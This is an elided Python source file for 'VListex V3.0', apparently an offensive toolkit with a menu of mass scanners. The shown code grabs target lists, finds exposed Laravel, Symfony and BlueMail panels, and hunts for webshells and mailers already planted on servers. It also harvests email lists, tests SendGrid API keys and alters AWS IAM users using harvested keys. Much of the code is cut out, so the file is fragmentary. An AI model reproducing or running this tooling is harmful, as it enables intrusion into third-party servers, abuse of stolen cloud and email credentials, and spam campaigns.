...
import webbrowser
import json
import requests, urllib3, re, time, random, sys, os, socket, argparse, subprocess, traceback, pickle
from colorama import Fore, Back, Style, init
from multiprocessing.dummy import Pool
import re, socket, numpy as np
...
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝░╚════╝░╚══════╝
    ...
    {r} _    ____    {w}       __           
    {r}| |  / / /   _{w}_{r}V3.0{w}_/ /____  _  __
    {r}| | / / /   / {w}/ ___/ __/ _ \| |/_/
    {w}| |/ / /___/ (__  ) /_{r}/  __/>  <  
    {w}|___/_____/_/____/\__/{r}\___/_/|_|                                                                                                                                                
       {r}[{w}theviolent.net{r}]{w}
   {w}- {r}- {w}- {r}- {w}- {r}- {w}- {r}- {w}- {r}- {w}- {r}- {w}- {r}- {w}- {r}- {w}- {r}- {w}- {r}- {w}- {r}- {w}- {r}- {w}- {r}- {w}- {r}- 
   """
   
    option="""   {r}[{w}1{r}] {w}Grabber Sites COM By Dates Updated Daily Result {r}[{w}GRABBER BY V.API{r}]
   {r}[{w}2{r}] {w}Grabber Sites By Domain + Country  {r}[{w}GRABBER BY V.API{r}]
   {r}[{w}3{r}] {w}Range IP From IPS List  {r}[{w}Range IP Midder + Ender{r}]
   {r}[{w}4{r}] {w}Auto Exploit Cookies BlueMail {r}[{w}Get Mailist / Weblist{r}]
   {r}[{w}5{r}] {w}Auto Check Bluemail sites/ip  {r}[{w}Check Bluemail Sites{r}]
   {r}[{w}6{r}] {w}Auto Check Laravel + Apache Symfony + Wordpress site/ip {r}[{w}Checker Priv8{r}]
   {r}[{w}7{r}] {w}Auto Filter Mailist Hotmail, Yahoo, Gmail {r}[{w}Priv8 Filter{r}]
   {r}[{w}8{r}] {w}Grabber Sites U.K From Page {r}[{w}Grabber By API{r}]
   {r}[{w}9{r}] {w}Domain To IP  {r}[{w}Change Domain List To IP List{r}]
   {r}[{w}10{r}] Grabber Option 2 + Option Number 9 + Option Number 6  + Auto Check + Save Live & Good IPs {r}[{w}PRIV8{r}]
   {r}[{w}11{r}] Option Number 9 + Option Number 3 Auto {r}[{w}Just Input Weblist Is Auto Changed To Ip And Auto Ranged IPs{r}]
   {r}[{w}12{r}] {w}Shell Scaner The Violent {r}[{w}Scan Shell 200+ From Web/Ip List{r}]
   {r}[{w}13{r}] {w}Grabber By Years/Date/Month {r}[{w}Ready To Use{r}]
   {r}[{w}14{r}] {w}Zoomeye Grabber With Query/Dork And API   {r}[{w}METHOD GET IP LIST APACHE/LARAVEL{r}]
   {r}[{w}15{r}] {w}Leakix Grabber With Query/Dork And API  {r}[{w}METHOD GET IP LIST APACHE/LARAVEL{r}]
   {r}[{w}16{r}] {w}ASN IPs Grabber Asn Method To Get IPs  {r}[{w}GET IPS RANGE FROM ASN{r}]
   {r}[{w}17{r}] {w}Remove Duplicate From List {r}[{w}Duplicate Remover Ip/Domain + ALL{r}]
   {r}[{w}18{r}] {w}Grab Mail/Email From Website List / Ip List + Auto Filter {r}[{w}Mail Extractor + Filter {r}]
   {r}[{w}19{r}] {w}Mass Check Sengrid Limit + Send Test In Your Mail {r}[{w}Sendgrid Checker With Mail{r}]
   {r}[{w}20{r}] {w}Mass Change User+Pass Aws + Send In Your Mail {r}[{w}Maintance{r}]
   {r}[{w}21{r}] {w}Generator Random IPS {r}[{w}Get Tons Random IP{r}]
   {r}[{w}22{r}] {w}Shell/Mailer Finder The Violent {r}[{w}Shell+Mailer Finder From Weblist/Ip List{r}]
   """
    ...
    select = input(f"   {Fore.RED}[{Fore.WHITE}!{Fore.RED}] Option > {Fore.WHITE}")
    if select == "1":
        os.system(["clear", "cls"][os.name == 'nt'])
        for line in logo.splitlines():
            print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
        ...
        for rage in nyampe:
            ...
            for result in soup.find_all('a'):
                if ".com" in result.text:
                    res.append(result)
                    print(result.text)
                    open( 'result-'+tanggal+'.txt', 'a').write(result.text+"\n")
                else:
                    continue
      #  except:
            pass
        ...
        try:
            ...
            if '404 Not Found' in r:
                ...
                print("Saved Resultt ...")
                time.sleep(6)
                open( "vres/" + negara + ".txt", "a" ).write( r + "\n" )
            else:
                print(r)
                print("Saved Resultt ...")
                time.sleep(6)
        ...
        for ip in open(inputip).read().splitlines():
            ...
            try:
                for result in range(0, 251):
                    ...
                    open('ranged-ender.txt', 'a').write(resultx + '\n')
                ...
                for result in range(0, 251):
                    ...
                    open('ranged-middle.txt', 'a').write(resultq + '\n')
        ...
        for web in open(inputip).read().splitlines():
            ...
            try:
                ...
                if "Null" in r.text:
                    ...
                    open('vres/exploit_cookies.txt', 'a').write(web + ' Cookies -> '+r.text + '')
            except:
                pass
    elif select == "5":
        os.system(["clear", "cls"][os.name == 'nt'])
            ...
            for webcek in inputlist.splitlines():
             ...
             #   try:
                ...
                if "authentication/login" in response.text: 
                    ...
                    open('vres/bluemail-valid.txt', 'a').write(webcek + '\n')
                else: 
                    print(f"|{webcek}| -> |{Fore.RED}Not BlueMail{Style.RESET_ALL}|")
                    open('vres/not-bluemail.txt', 'a').write(webcek + '\n')
        ...
        for line in logo.splitlines():
                    print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
                    time.sleep(0.05)
        inputlist = open(input(f"{Fore.WHITE}|{Fore.RED}INPUT{Fore.WHITE}| Enter List File Web : {Style.RESET_ALL}"), 'r').read().split('\n')
            ...
            try:
                ...
                if "symfony/profiler/" in response.text or "symfony" in response.text: 
                    ...
                    if "symfony/profiler/" in response2.text or "symfony" in response2.text: 
                        ...
                        open('vres/unknown-live.txt', 'a').write(webcek + '\n')
        ...
        if not os.path.exists( sitelists ): vinfo( "{r}x", "the list not found in current dir" ); exit()
        try:
                ...
                for website in arrayweb:
                    ...
                    for result in s.find_all('font'):
                        ...
                        if findall('([A-Za-z0-9]\\.co.uk)', result):
                            open('vres/result-uk-frompage.txt', 'a').write(result+"\n")
        ...
        def domtoip(filewebs3):
            try:
                ...
                open('vres/domain-to-ips.txt', 'a').write(hostn + '\n')
            except:
                pass


        filewebs3 = open(input(f"{Fore.WHITE}|{Fore.RED}INPUT{Fore.WHITE}| Enter List File Web : {Style.RESET_ALL}"), 'r').read().split('\n')
                    ...
                    if response.status_code == 200:
                        ...
                        if "laravel_session" in response.cookies: 
                            ...
                            if webcek not in tempatsampah:
                                tempatsampah.append(webcek)
                                print(f"|{webcek}| -> |{Fore.GREEN}UNKNOWN FRAMEWORK{Style.RESET_ALL}|")
                                open('vres/live-ips.txt', 'a').write(webcek + '\n')
                            else:
                                print(f"|{webcek}|  -> |{Fore.RED}DUPLICATE IP{Style.RESET_ALL}|")
        ...
        try:
            ...
            if '404 Not Found' in r:
                ...
                print(r4)
                print("Saved Resultt ...")
                open( "vres/" + negara + ".txt", "a" ).write( r4 + "\n" )
                if '404 Not Found' in r4:
                    os.system(["clear", "cls"][os.name == 'nt'])
                    print('MAYBE YOU INPUT WRONG COUNTRY / DOMAIN NAME PLEASE CHECK IT')
                ...
                open( "vres/" + negara + ".txt", "a" ).write( r + "\n" )
            time.sleep(3)
            print(f"Already Saved In vres/{negara}.txt")
        except:
            pass
        ...
        time.sleep(3)
        inputlist = open("vres/" + negara + ".txt", 'r').read().split('\n')    
        if inputlist:
          #  try:
            with ThreadPoolExecutor(int(threadblue)) as zz:
                zz.map(cekblue, inputlist)
        ...
        def domtoip(filewebs3):
            try:
                ...
                pid = os.getpid()
                print(f"{Fore.WHITE}|{Fore.GREEN}SUCCES {pid}{Fore.WHITE}|{Style.RESET_ALL} |{filewebs4}|-|{Fore.BLUE}{hostn}{Style.RESET_ALL}|")
                open('vres/domain-to-ips-option-11.txt', 'a').write(hostn + '\n')
        ...
        if filewebs3:
          #  try:
            with ThreadPoolExecutor(int(threaddom)) as zz:
                ...
                time.sleep(1)
                os.system("cls")
                print(f"\n {Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Saving Domain To IPs First ")
                time.sleep(1)
                os.system("cls")
                ...
                time.sleep(1.5)
                for ip in open('vres/domain-to-ips-option-11.txt').read().splitlines():
            ...
            for sites in sote.splitlines():
                ...
                for shell in shells:    
                    ...
                    if 'drwxr-xr-x' in respz:
                        ...
                        open("shells.txt","a").write(sites+"/"+shell+"\n")
                        return 0
                    else:
      ...
      #  if sites:
        ...
        def grab2(tanggal,data):
            if data in open(f"vres/{tanggal}.txt").read().splitlines():
                return
            open(f"vres/{tanggal}.txt","a+").write(f"{data}\n")

        def grab3(tanggal,lastpage,y,m,d):
            req = requests.Session()
            print(f"\n{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Total Page To Grab In {tanggal} Is > {lastpage[0]}")
            ...
            print('\n[#] Success > {} domain'.format(sum(1 for line in open(f'vres/{tanggal}.txt', 'r'))))
        ...
        tanggal = f"{y}-{m}-{d}"
        if not os.path.exists("vres"):
            os.makedirs("vres")
        if not os.path.exists(f"vres/{tanggal}.txt"):
            open(f"vres/{tanggal}.txt","w").write("")
          ...
          #  try:
            ...
            for Yh in range(0, int(len(rather)) - 1):
                ...
                for IP in IPL:  
                    ...
                    open('vres/UNCHECKED_ASN_IPS.txt', 'a', errors='ignore', encoding='utf-8').write(f"{IP}\n")
                    print(f"\x1b[95m{IP}")
       ...
       # while True:
            ...
            for mail in mails: 
                if mail not in tmp:
                    ...
                    if is_email( mail, check_dns=True):
                        ...
                        open('vres/mailist-vlistexv3.txt', 'a').write( mail+'\n' )
                    else:
        ...
        def SendgridCheck(apikey):
            try:
                ...
                with open("vres/sendgridcheck-results.txt", "a") as x:
        ...
        def AwsUser(ACCESS_KEY, SECRET_KEY, REGION):
            try:
                ...
                simpan = open('vres/IamAccount.txt', 'a')
                ...
                for script in listaa:
                    ...
                    while True:
                        ...
                        if 'drwxr-xr-x' in req_first.text or '-rw-r--r--' in req_first.text or 'drwxr-x---' in req_first.text:
                            ...
                            with open('vres/shell.txt', 'a') as (file):
                                file.write(url + '\n')
                                file.close()
                            break
                            ...
                            with open('vres/uploader-shell.txt', 'a') as (gn):
                                gn.write(url + '\n')
                                gn.close()
                            break
                            ...
                            Good = Good + 1
                            print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.GREEN} Found Shell {Fore.WHITE}| {Fore.YELLOW}{url}')
                            with open('vres/shell.txt', 'a') as (fox):
                                Good = Good + 1
                                fox.write(url + '\n')
                                fox.close()
                            break
                            ...
                            with open('vres/mailer.txt', 'a') as (mailers):
                                mailers.write(url + '\n')
                                mailers.close()
                            break
                        else:
                            if 'method=post>Password:' in req_first.text or '<input type=password name=pass' in req_first.text:
                                ...
                                with open('vres/user-pass.txt', 'a') as (pa):
                                    pa.write(url + '\n')
                                    pa.close()
                                break
                            else:
                                if 'name="uploader" id="uploader">' in req_first.text:
                                    ...
                                    with open('vres/vuln-uploader.txt', 'a') as (fo):
                                        fo.write(url + '\n')
                                        fo.close()
                                    break
                                else:
...
if __name__ == '__main__':
    try:
        main()
        print(f'{Fore.RED}[{Fore.WHITE}X{Fore.RED}]{Fore.WHITE} Tools Updated , Now You Can Run The Tools')
        print(f"""
{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]           Patch Note 3.0                                       {Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]
{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Add Option Untill 22 Fiture + Optimize & Fix Bug               {Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]
{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Increase Speed + Increase Accuration + Fix Mailist Dup         {Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]
{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Priv8 Tools For Grabbing And Scanning + FIX STUCK              {Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]
{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] If U Find Bug In Option Contact Telegram : @Violent_Real       {Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]
              """)
